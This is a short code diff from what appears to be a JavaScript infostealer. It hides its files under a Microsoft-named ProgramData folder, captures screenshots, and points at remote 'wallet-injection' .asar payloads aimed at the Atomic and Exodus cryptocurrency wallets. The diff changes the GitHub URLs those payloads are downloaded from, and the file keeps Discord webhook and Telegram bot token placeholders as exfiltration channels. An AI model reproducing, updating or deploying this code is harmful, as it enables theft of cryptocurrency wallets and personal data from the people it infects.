@@ -21,8 +21,8 @@ const globalSettingsPath = path.join('C:\\', 'ProgramData', 'Microsoft', 'UserSe
 const mainFolderPath = path.join(globalSettingsPath, mainFolderName, `${locale}-${computerName}`); const globalLockFile = path.join(globalSettingsPath, 'WinHost.lock');
 const screenshotPath = path.join(mainFolderPath, 'Screenshot', 'screenshot.png');
 var appdata = process.env.APPDATA, LOCAL = process.env.LOCALAPPDATA, localappdata = process.env.LOCALAPPDATA;
-const atomicInjectionUrl = 'https://github.com/AVMTools/wallet-injection/raw/refs/heads/main/atomic.asar';
-const exodusInjectionUrl = 'https://github.com/AVMTools/wallet-injection/raw/refs/heads/main/exodus.asar';
+const atomicInjectionUrl = 'https://github.com/avminjection/wallet-injection/raw/refs/heads/main/atomic.asar';
+const exodusInjectionUrl = 'https://github.com/avminjection/wallet-injection/raw/refs/heads/main/exodus.asar';
 
 const discordWebhookUrl = 'REMPLACE_ME';
 const telegramBotToken = 'REMPLACE_ME';
@@ -3059,4 +3059,5 @@ function checkSystem() {
     }
 
 })();
+
 
